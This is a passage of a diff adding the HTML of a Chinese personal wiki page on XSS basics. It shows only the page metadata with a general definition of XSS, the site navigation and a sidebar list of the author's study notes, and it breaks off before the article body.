@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+    <title>XSS基础学习 | kn0sky&#39;wiki</title>
+    
+    
+        <meta name="keywords" content="kn0sky">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="XSS基础学习XSS定义原理：利用网站对用户输入、网站输出过滤不足的缺陷，构造能够对其他用户造成影响的html代码，从而对访问者造成侵害。 （以下内容来自百度百科） XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、Active">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS基础学习">
+<meta property="og:url" content="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/XSS%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="kn0sky&#39;wiki">
+<meta property="og:description" content="XSS基础学习XSS定义原理：利用网站对用户输入、网站输出过滤不足的缺陷，构造能够对其他用户造成影响的html代码，从而对访问者造成侵害。 （以下内容来自百度百科） XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、Active">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/XSS%E5%9F%BA%E7%A1%80/image-20200612103525633.png">
+<meta property="og:image" content="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/XSS%E5%9F%BA%E7%A1%80/image-20200612103812395.png">
+<meta property="og:image" content="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/XSS%E5%9F%BA%E7%A1%80/image-20200612105334097.png">
+<meta property="og:image" content="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/XSS%E5%9F%BA%E7%A1%80/image-20200612111129462.png">
+<meta property="article:published_time" content="2020-06-12T02:57:19.000Z">
+<meta property="article:modified_time" content="2020-06-13T00:59:00.000Z">
+<meta property="article:author" content="kn0sky">
+<meta property="article:tag" content="kn0sky">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/XSS%E5%9F%BA%E7%A1%80/image-20200612103525633.png">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="kn0sky&#39;wiki" type="application/atom+xml">
+    
+
+    
+        <link rel="icon" href="/favicon.ico">
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+</html>
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">kn0sky&#39;wiki</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">首页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/categories">分类</a>
+                
+                    <a class="main-nav-link" href="/tags">标签</a>
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">首页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">分类</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">标签</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id="categories">
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id="allExpand" href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            XCTF攻防世界WP
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            新手练习区
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            REVERSE
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWP/%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/REVERSE/re001-open-source/">open-source Write Up</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            备忘笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%A4%87%E5%BF%98%E7%AC%94%E8%AE%B0/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/">常用工具备忘录</a></li>  <li class="file"><a href="/wiki/%E5%A4%87%E5%BF%98%E7%AC%94%E8%AE%B0/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E5%BF%98%E5%BD%95/">搭建hexo博客备忘录</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            51单片机学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A801--LED%E6%B5%81%E6%B0%B4%E7%81%AF/">51单片机入门01--LED流水灯</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A802--%E6%95%B0%E7%A0%81%E7%AE%A1/">51单片机入门02--数码管</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A803--%E6%8C%89%E9%94%AE/">51单片机入门03--按键</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A804--%E5%AE%9A%E6%97%B6&%E8%AE%A1%E6%95%B0%E5%99%A8/">51单片机入门04--定时&计数器</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            C++学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C++%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8001--%E5%88%9D%E8%A7%81C++/">C++基础01--初见C++</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            C语言学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8001--%E5%88%9D%E8%A7%81C%E8%AF%AD%E8%A8%80/">C语言基础01--初见C语言</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8002--%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/">C语言基础02--条件语句</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8003--%E5%AE%8F&%E5%87%BD%E6%95%B0&%E6%95%B0%E7%BB%84/">C语言基础03--宏&函数&数组</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8004--%E6%8C%87%E9%92%88/">C语言基础04--指针</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8005--%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/">C语言基础05--字符串操作</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8006--%E5%AD%98%E5%82%A8%E7%B1%BB&%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">C语言基础06--存储类&内存管理</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8007--%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">C语言基础07--文件操作</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8008--%E7%BB%93%E6%9E%84%E4%BD%93/">C语言基础08--结构体</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8009--C%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8%E5%92%8CC%E5%BA%93/">C语言基础09--C预处理器和C库</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            Web安全学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            SQLi
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            实战
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/%E5%AE%9E%E6%88%98/%E6%9F%90%E7%BD%91%E7%AB%99%E5%AD%98%E5%9C%A8%E4%BA%8B%E4%BB%B6%E5%9E%8Bsql%E6%B3%A8%E5%85%A501/">某网站存在事件型sql注入01</a></li>  </ul> 
+                    </li> 
+                     <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/sqli%E5%9F%BA%E7%A1%80/">sql注入基础学习</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            XSS
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            练习平台
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0/XSS_Challenges/">XSS_Challenges Write Up</a></li>  </ul> 
+                    </li> 
+                     <li class="file active"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/XSS%E5%9F%BA%E7%A1%80/">XSS基础学习</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            前端入门学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E5%85%A5%E9%97%A801--HTML&CSS%E5%9F%BA%E7%A1%80/">前端入门01--HTML和CSS基础</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            半导体物理学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%8D%8A%E5%AF%BC%E4%BD%93%E7%89%A9%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%8D%8A%E5%AF%BC%E4%BD%93%E7%89%A9%E7%90%8601--%E8%83%BD%E5%B8%A6%E7%90%86%E8%AE%BA/">半导体物理01--能带理论</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            原理笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/%E5%AF%84%E5%AD%98%E5%99%A8%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/">寄存器逻辑结构</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/%E5%86%85%E5%AD%98/">内存</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            汇编基础学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8001--%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/">汇编基础01：基础概念</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8002--%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/">汇编基础02：第一个程序</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8003--%E6%95%B0%E5%AD%A6%E8%BF%90%E7%AE%97&%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97/">汇编基础03：数学运算&逻辑运算</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8004--%E5%BE%AA%E7%8E%AF/">汇编基础04：循环</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8005--%E5%A0%86%E6%A0%88/">汇编基础05：堆栈</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8006--%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%81%E6%8C%87%E4%BB%A4/">汇编基础06：数据传送指令</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8007--%E6%AF%94%E8%BE%83%E6%8C%87%E4%BB%A4/">汇编基础07：比较指令</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8008--JCC%E6%8C%87%E4%BB%A4/">汇编基础08： JCC 转移指令</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8009--%E4%BC%A0%E9%80%81%E6%8C%87%E4%BB%A4/">汇编基础09--传送指令</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8012--%E6%95%B0%E7%BB%84%E5%92%8C%E7%BB%93%E6%9E%84%E4%BD%93/">汇编基础12--数组和结构体</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8010--%E4%BD%BF%E7%94%A8%E5%87%BD%E6%95%B0/">汇编基础10--使用函数</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8011--win32%E6%B1%87%E7%BC%96/">汇编基础11--win32汇编</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E4%BD%9C%E4%B8%9A--%E7%94%B5%E8%AF%9D%E7%B0%BF/">汇编作业--电话簿</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8013--%E9%97%B4%E6%8E%A5%E5%AF%BB%E5%9D%80/">汇编基础13--间接寻址</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            逆向入门学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%8001--%E5%88%9D%E8%A7%81%E9%80%86%E5%90%91/">逆向基础01--初见逆向</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%8002--%E5%88%9D%E8%AF%95%E7%A0%B4%E8%A7%A3/">逆向基础02--初试破解</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            审计笔记
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            CMS审计
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            6KZZv1.4
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/CMS%E5%AE%A1%E8%AE%A1/6KZZv1.4/main/"></a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     <li class="file"><a href="/wiki/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A001--%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/">代码审计学习01--搭建php调试环境</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            折腾笔记
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            博客搭建
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BAwiki/">使用hexo搭建个人wiki</a></li>  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/%E5%80%9F%E5%8A%A9%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%9E%E7%8E%B0hexo%E5%85%A8%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/">借助云服务器实现hexo全自动部署</a></li>  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/hexo%E8%81%94%E5%8A%A8Typora/">hexo联动Typora</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            手机连接电脑
+                        </a>
